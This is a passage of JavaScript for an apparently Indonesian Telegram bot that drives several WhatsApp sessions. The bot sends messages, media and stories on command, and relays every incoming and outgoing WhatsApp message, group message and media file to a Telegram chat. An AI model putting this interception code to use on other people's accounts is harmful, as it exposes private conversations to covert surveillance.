      text += `🔹 *${g.subject}*\n🆔 ${id}\n\n`;
      count++;
    }

    if (count === 0) text = "❌ Tidak ada grup yang ditemukan.";
    bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
  }
});

// ============================================================================
// 📨 FITUR /KIRIMPESAN
// ============================================================================
bot.on("message", async (msg) => {
  if (!isOwner(msg.from.id)) return;

  // ======= Command utama: /kirimpesan <session> <target> [pesan opsional] =======
  if (msg.text && msg.text.startsWith("/kirimpesan")) {
    const args = msg.text.trim().split(" ");
    if (args.length < 3)
      return bot.sendMessage(
        msg.chat.id,
        "⚠️ Format salah!\nGunakan: /kirimpesan <session> <target> <pesan opsional>"
      );

    const sessionNumber = args[1];
    const target = args[2];
    const messageText = args.slice(3).join(" ") || "";
    const sock = sessions.get(sessionNumber);

    if (!sock)
      return bot.sendMessage(
        msg.chat.id,
        `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
        { parse_mode: "Markdown" }
      );

    const jid = target.includes("@g.us") ? target : `${target}@s.whatsapp.net`;

    if (messageText) {
      try {
        await sock.sendMessage(jid, { text: messageText });
        bot.sendMessage(msg.chat.id, `✅ Pesan teks terkirim ke ${target}`);
      } catch (err) {
        console.error("Gagal kirim teks:", err);
        bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
      }
    } else {
      bot.sendMessage(
  msg.chat.id,
  "📩 Sekarang *reply pesanmu* untuk dikirim ke WhatsApp.",
  { parse_mode: "Markdown" }
     );
    }
  }

  // ======= Mode reply untuk kirim media / gabungan teks =======
  if (msg.reply_to_message && msg.reply_to_message.text?.startsWith("/kirimpesan")) {
    const match = msg.reply_to_message.text.match(/^\/kirimpesan\s+(\S+)\s+(\S+)/);
    if (!match) return;

    const sessionNumber = match[1];
    const target = match[2];
    const sock = sessions.get(sessionNumber);
    if (!sock)
      return bot.sendMessage(msg.chat.id, `⚠️ Sesi *${sessionNumber}* tidak aktif.`, {
        parse_mode: "Markdown",
      });

    const jid = target.includes("@g.us") ? target : `${target}@s.whatsapp.net`;
    const caption = msg.caption || msg.text || "";

    try {
      const getFileBuffer = async (fileId) => {
        const link = await bot.getFileLink(fileId);
        const res = await axios.get(link, { responseType: "arraybuffer" });
        return Buffer.from(res.data);
      };

      if (msg.photo) {
        const buffer = await getFileBuffer(msg.photo.at(-1).file_id);
        await sock.sendMessage(jid, { image: buffer, caption });
      } else if (msg.video) {
        const buffer = await getFileBuffer(msg.video.file_id);
        await sock.sendMessage(jid, { video: buffer, caption });
      } else if (msg.document) {
        const buffer = await getFileBuffer(msg.document.file_id);
        await sock.sendMessage(jid, {
          document: buffer,
          fileName: msg.document.file_name || "file",
          caption,
        });
      } else if (msg.audio) {
        const buffer = await getFileBuffer(msg.audio.file_id);
        await sock.sendMessage(jid, { audio: buffer, mimetype: "audio/mpeg" });
      } else if (msg.voice) {
        const buffer = await getFileBuffer(msg.voice.file_id);
        await sock.sendMessage(jid, { audio: buffer, ptt: true });
      } else if (msg.sticker) {
        const buffer = await getFileBuffer(msg.sticker.file_id);
        await sock.sendMessage(jid, { sticker: buffer });
      } else if (msg.text) {
        await sock.sendMessage(jid, { text: caption });
      } else {
        return bot.sendMessage(msg.chat.id, "⚠️ Jenis pesan ini belum bisa dikirim.");
      }

      bot.sendMessage(msg.chat.id, `✅ Pesan berhasil dikirim ke ${target}`);
    } catch (err) {
      console.error("Gagal kirim media:", err);
      bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
    }
  }

  // ======================================================================
  // 🧾 FITUR BARU: /addstory <session> [teks opsional]
  // ======================================================================
  if (msg.text && msg.text.startsWith("/addstory")) {
    const args = msg.text.trim().split(" ");
    if (args.length < 2)
      return bot.sendMessage(
        msg.chat.id,
        "⚠️ Format salah!\nGunakan: /addstory <session> <teks opsional>"
      );

    const sessionNumber = args[1];
    const storyText = args.slice(2).join(" ") || "";
    const sock = sessions.get(sessionNumber);

    if (!sock)
      return bot.sendMessage(
        msg.chat.id,
        `⚠️ Sesi *${sessionNumber}* tidak ditemukan / belum aktif.`,
        { parse_mode: "Markdown" }
      );

    if (storyText) {
      try {
        await sock.sendMessage("status@broadcast", { text: storyText });
        return bot.sendMessage(msg.chat.id, "✅ Story teks berhasil dikirim!");
      } catch (err) {
        console.error("Gagal kirim story teks:", err);
        return bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
      }
    } else {
      bot.sendMessage(
        msg.chat.id,
        "📸 Sekarang *reply pesan (foto atau video + caption opsional)* ke pesan ini untuk dijadikan story WhatsApp.",
        { parse_mode: "Markdown" }
      );
    }
  }

  // Mode reply media story
  if (msg.reply_to_message && msg.reply_to_message.text?.startsWith("/addstory")) {
    const match = msg.reply_to_message.text.match(/^\/addstory\s+(\S+)/);
    if (!match) return;
    const sessionNumber = match[1];
    const sock = sessions.get(sessionNumber);
    if (!sock) return bot.sendMessage(msg.chat.id, "⚠️ Sesi tidak aktif.");

    const caption = msg.caption || "";
    try {
      const getFileBuffer = async (fileId) => {
        const link = await bot.getFileLink(fileId);
        const res = await axios.get(link, { responseType: "arraybuffer" });
        return Buffer.from(res.data);
      };

      if (msg.photo) {
        const buffer = await getFileBuffer(msg.photo.at(-1).file_id);
        await sock.sendMessage("status@broadcast", { image: buffer, caption });
      } else if (msg.video) {
        const buffer = await getFileBuffer(msg.video.file_id);
        await sock.sendMessage("status@broadcast", { video: buffer, caption });
      } else {
        return bot.sendMessage(msg.chat.id, "⚠️ Kirim foto atau video untuk story.");
      }

      bot.sendMessage(msg.chat.id, "✅ Story berhasil diunggah!");
    } catch (err) {
      console.error("Gagal upload story:", err);
      bot.sendMessage(msg.chat.id, `❌ ${err.message}`);
    }
  }
});

// ============================================================================
// 📩 FORWARD PESAN MASUK KE TELEGRAM (DENGAN ID GRUP JIKA GRUP)
// ============================================================================
async function forwardToTelegram(
  type,
  fromNumber,
  messageContent,
  sessionNumber,
  mediaBuffer = null,
  mimeType = null,
  isGroup = false,
  groupName = null,
  groupId = null,
  senderName = null
) {
  try {
    if (!NOTIF_ID) return;

    let caption = "";
    if (isGroup) {
      caption = `👥 *Grup:* ${groupName}\n🆔 *ID Grup:* ${groupId}\n👤 *Pengirim:* ${senderName || fromNumber}`;
    } else if (type === "out") {
      caption = `📤 *${sessionNumber} → ${fromNumber}*`;
    } else {
      caption = `📥 *${fromNumber} → ${sessionNumber}*`;
    }

    if (messageContent) caption += `\n💬 ${messageContent}`;

    if (mediaBuffer && mimeType) {
      if (mimeType.startsWith("image/"))
        await bot.sendPhoto(NOTIF_ID, mediaBuffer, { caption, parse_mode: "Markdown" });
      else if (mimeType.startsWith("video/"))
        await bot.sendVideo(NOTIF_ID, mediaBuffer, { caption, parse_mode: "Markdown" });
      else if (mimeType.startsWith("audio/"))
        await bot.sendAudio(NOTIF_ID, mediaBuffer, { caption });
      else {
        const ext = mime.extension(mimeType) || "bin";
        await bot.sendDocument(NOTIF_ID, mediaBuffer, {}, { filename: `file.${ext}` });
      }
    } else {
      await bot.sendMessage(NOTIF_ID, caption, { parse_mode: "Markdown" });
    }
  } catch (err) {
    console.error("Gagal kirim notifikasi Telegram:", err.message);
  }
}

// ============================================================================
// 🔗 HANDLER PESAN MASUK DARI WHATSAPP
// ============================================================================
function attachMessageHandler(sock, botNumber) {
  if (sock._handlerAttached) return;
  sock._handlerAttached = true;

  sock.ev.on("messages.upsert", async (m) => {
    if (!waMonitoring) return;
    try {
      const msg = m.messages[0];
      if (!msg.message) return;

      const from = msg.key.remoteJid;
      const fromMe = msg.key.fromMe;
      const isGroup = from.endsWith("@g.us");
      const type = Object.keys(msg.message)[0];
      let text =
        msg.message.conversation ||
        msg.message.extendedTextMessage?.text ||
        msg.message[type]?.caption ||
        "";
      let buffer = null,
        mimetype = null;

      if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(type)) {
        const stream = await downloadContentFromMessage(msg.message[type], type.replace("Message", ""));
        const chunks = [];
        for await (const c of stream) chunks.push(c);
        buffer = Buffer.concat(chunks);
        mimetype = msg.message[type].mimetype;
      }

      if (msg.message.call) text = "📞 *Panggilan Masuk*";

      if (isGroup) {
        const meta = await sock.groupMetadata(from);
        const sender = msg.key.participant?.split("@")[0];
        await forwardToTelegram(
          "in",
          sender,
          text,
          botNumber,
          buffer,
          mimetype,
          true,
          meta.subject,
          from,
          sender
        );
      } else {
        if (fromMe)
          await forwardToTelegram("out", from.split("@")[0], text, botNumber, buffer, mimetype);
        else
          await forwardToTelegram("in", from.split("@")[0], text, botNumber, buffer, mimetype);
      }
    } catch (err) {
      console.error("Error pesan WA:", err.message);
    }
  });
}

// ============================================================================
// 🔁 PASANG HANDLER UNTUK SEMUA SESSION
// ============================================================================
setInterval(() => {
  for (const [botNumber, sck] of sessions) {
    if (sck && !sck._handlerAttached) attachMessageHandler(sck, botNumber);
  }
}, 5000);